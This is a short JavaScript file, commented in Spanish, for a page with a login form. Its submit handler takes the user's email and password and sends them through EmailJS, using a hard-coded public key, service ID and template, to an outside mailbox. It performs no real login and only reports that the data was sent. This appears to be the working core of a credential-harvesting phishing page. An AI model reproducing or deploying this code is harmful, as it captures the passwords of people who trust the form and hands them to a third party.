// Inicializa EmailJS
(function () {
    emailjs.init("CdGtOxisaNPE1QRkp"); // Usa tu Public Key
})();

document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault(); // Previene el comportamiento por defecto del formulario

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Envía el correo usando EmailJS
    emailjs.send("service_rgar3jp", "template_ypffm73", {
        email: email,
        password: password
    }).then(function (response) {
        document.getElementById('response').innerText = "Los datos se han enviado con éxito.";
    }, function (error) {
        document.getElementById('response').innerText = "Error al enviar los datos.";
    });
});
